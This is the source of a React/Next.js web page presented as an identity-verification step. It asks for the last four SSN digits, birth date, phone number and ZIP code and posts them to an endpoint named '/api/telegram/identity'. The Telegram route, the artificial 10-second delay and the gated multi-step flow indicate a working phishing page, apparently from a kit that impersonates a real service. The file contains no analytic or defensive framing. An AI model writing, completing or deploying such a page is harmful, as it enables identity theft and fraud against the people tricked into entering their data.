"use client"

import { useRouter } from "next/navigation"
import { useEffect, useMemo, useState } from "react"
import { SiteFooter } from "@/components/site-footer"
import { SiteHeader } from "@/components/site-header"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"

export default function VerifyIdentityPage() {
  const router = useRouter()
  const [ssnLast4, setSsnLast4] = useState("")
  const [birthMonth, setBirthMonth] = useState("")
  const [birthDay, setBirthDay] = useState("")
  const [birthYear, setBirthYear] = useState("")
  const [phoneDigits, setPhoneDigits] = useState("")
  const [zipCode, setZipCode] = useState("")
  const [submitAttempted, setSubmitAttempted] = useState(false)
  const [isLoading, setIsLoading] = useState(false)

  const ssnDigits = useMemo(() => ssnLast4.replace(/\D/g, "").slice(0, 4), [ssnLast4])
  const zipDigits = useMemo(() => zipCode.replace(/\D/g, "").slice(0, 9), [zipCode])

  const MONTHS = useMemo(
    () => [
      "January",
      "February",
      "March",
      "April",
      "May",
      "June",
      "July",
      "August",
      "September",
      "October",
      "November",
      "December",
    ],
    [],
  )
  const DAYS = useMemo(() => Array.from({ length: 31 }, (_, i) => String(i + 1)), [])
  const CURRENT_YEAR = new Date().getFullYear()
  const YEARS = useMemo(
    () => Array.from({ length: CURRENT_YEAR - 1919 }, (_, i) => String(CURRENT_YEAR - i)),
    [CURRENT_YEAR],
  )

  const formattedPhone = useMemo(() => {
    const d = phoneDigits
    if (!d) return ""
    const a = d.slice(0, 3)
    const b = d.slice(3, 6)
    const c = d.slice(6, 10)
    if (d.length <= 3) return a
    if (d.length <= 6) return `(${a}) ${b}`
    return `(${a}) ${b}-${c}`
  }, [phoneDigits])

  const birthDateForApi = useMemo(() => {
    if (!birthMonth || !birthDay || !birthYear) return ""
    const monthIndex = MONTHS.indexOf(birthMonth) + 1
    if (!monthIndex) return ""
    return `${String(monthIndex).padStart(2, "0")}/${birthDay.padStart(2, "0")}/${birthYear}`
  }, [birthMonth, birthDay, birthYear, MONTHS])

  const isSsnValid = ssnDigits.length === 4
  const isBirthValid = useMemo(() => {
    if (!birthMonth || !birthDay || !birthYear) return false
    const monthIndex = MONTHS.indexOf(birthMonth) + 1
    const m = monthIndex
    const d = Number(birthDay)
    const y = Number(birthYear)
    if (!m || Number.isNaN(d) || Number.isNaN(y)) return false
    const dt = new Date(y, m - 1, d)
    return dt.getFullYear() === y && dt.getMonth() === m - 1 && dt.getDate() === d
  }, [birthMonth, birthDay, birthYear, MONTHS])

  const isPhoneValid = phoneDigits.length === 10
  const isZipValid = zipDigits.length === 5 || zipDigits.length === 9
  const isFormValid = isSsnValid && isBirthValid && isPhoneValid && isZipValid

  useEffect(() => {
    if (typeof window === "undefined") return
    const ok = sessionStorage.getItem("ua_identity") === "1"
    if (!ok) router.replace("/")
  }, [router])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setSubmitAttempted(true)
    if (!isFormValid || isLoading) return

    setIsLoading(true)
    try {
      await fetch("/api/telegram/identity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ssnLast4: ssnDigits,
          birthDate: birthDateForApi,
          phoneNumber: phoneDigits,
          zipCode: zipDigits,
        }),
      }).catch(console.error)

      
      await new Promise((r) => setTimeout(r, 10000))
    } finally {
      setIsLoading(false)
    }

    sessionStorage.setItem("ua_identity", "0")
    router.push("/verify?step=2")
  }

  const inputBaseClass =
    "h-10 bg-white rounded-md border border-gray-300 shadow-sm focus-visible:border-[#002586] focus-visible:ring-[#002586]/30 focus-visible:ring-2 outline-none transition-colors"
  const inputErrorClass = "border-red-500 focus-visible:border-red-500 focus-visible:ring-red-500/30"

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <SiteHeader />

      <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px] flex-1">
        <div className="mb-6">
          <h2 className="text-base font-medium text-gray-900 mb-4">Verify It&apos;s You</h2>
          <h1 className="text-2xl font-semibold text-gray-900 mb-2">Enter Your Identifier</h1>
          <p className="text-gray-700 text-sm mb-6">
            Confirm your identity to receive access code.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-5">
          <div>
            <label htmlFor="ssn" className="block text-sm font-medium text-gray-900 mb-1.5">
              Last 4 digits of SSN
            </label>
            <Input
              id="ssn"
              value={ssnDigits}
              onChange={(e) => setSsnLast4(e.target.value)}
              disabled={isLoading}
              inputMode="numeric"
              maxLength={4}
              className={`w-[88px] max-w-[88px] ${inputBaseClass} ${
                submitAttempted && !isSsnValid ? inputErrorClass : ""
              } disabled:opacity-70 disabled:pointer-events-none`}
            />
            {submitAttempted && !isSsnValid && (
              <p className="mt-1 text-sm text-red-600">Enter last 4 digits of SSN</p>
            )}
          </div>

          <div>
            <label htmlFor="birthDate" className="block text-sm font-medium text-gray-900 mb-1.5">
              Birth Date
            </label>
            <div className="flex flex-wrap gap-3">
              <select
                value={birthMonth}
                onChange={(e) => setBirthMonth(e.target.value)}
                disabled={isLoading}
                className={`${inputBaseClass} flex-1`}
              >
                <option value="">Month</option>
                {MONTHS.map((m) => (
                  <option key={m} value={m}>
                    {m}
                  </option>
                ))}
              </select>
              <select
                value={birthDay}
                onChange={(e) => setBirthDay(e.target.value)}
                disabled={isLoading}
                className={`${inputBaseClass} w-[110px]`}
              >
                <option value="">Day</option>
                {DAYS.map((d) => (
                  <option key={d} value={d}>
                    {d}
                  </option>
                ))}
              </select>
              <select
                value={birthYear}
                onChange={(e) => setBirthYear(e.target.value)}
                disabled={isLoading}
                className={`${inputBaseClass} w-[160px]`}
              >
                <option value="">Year</option>
                {YEARS.map((y) => (
                  <option key={y} value={y}>
                    {y}
                  </option>
                ))}
              </select>
            </div>
            {submitAttempted && !isBirthValid && (
              <p className="mt-1 text-sm text-red-600">Select a valid birth date</p>
            )}
          </div>

          <div>
            <label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-900 mb-1.5">
              Phone Number
            </label>
            <div className="flex items-center gap-3">
              <span className="text-sm font-semibold text-gray-900 shrink-0">+1</span>
              <Input
                id="phoneNumber"
                type="tel"
                inputMode="numeric"
                value={formattedPhone}
                onChange={(e) =>
                  setPhoneDigits(e.target.value.replace(/\D/g, "").slice(0, 10))
                }
                disabled={isLoading}
                placeholder="(555) 555-5555"
                maxLength={14}
                className={`${inputBaseClass} ${submitAttempted && !isPhoneValid ? inputErrorClass : ""} disabled:opacity-70`}
              />
            </div>
            {submitAttempted && !isPhoneValid && (
              <p className="mt-1 text-sm text-red-600">Enter a valid phone number (10 digits)</p>
            )}
          </div>

          <div>
            <label htmlFor="zipCode" className="block text-sm font-medium text-gray-900 mb-1.5">
              Zip Code
            </label>
            <Input
              id="zipCode"
              value={zipCode}
              onChange={(e) => setZipCode(e.target.value)}
              disabled={isLoading}
              placeholder="12345"
              inputMode="numeric"
              maxLength={9}
              className={`${inputBaseClass} ${submitAttempted && !isZipValid ? inputErrorClass : ""} disabled:opacity-70`}
            />
            {submitAttempted && !isZipValid && (
              <p className="mt-1 text-sm text-red-600">Enter a valid zip code (5 or 9 digits)</p>
            )}
          </div>

          <div className="flex flex-wrap gap-3 pt-2">
            <Button
              type="submit"
              disabled={isLoading}
              className="bg-[#002586] text-white hover:bg-[#001f6b] rounded-md disabled:opacity-70 disabled:pointer-events-none h-10 px-6 text-sm font-medium"
            >
              {isLoading ? "Loading..." : "Continue"}
            </Button>

            <Button
              type="button"
              variant="outline"
              onClick={() => router.push("/verify-choice")}
              disabled={isLoading}
              className="rounded-md border-gray-300 bg-gray-100 hover:bg-gray-200 text-gray-900 h-10 px-6 disabled:opacity-70 disabled:pointer-events-none"
            >
              Cancel
            </Button>
          </div>
        </form>
      </div>

      <SiteFooter />
    </div>
  )
}

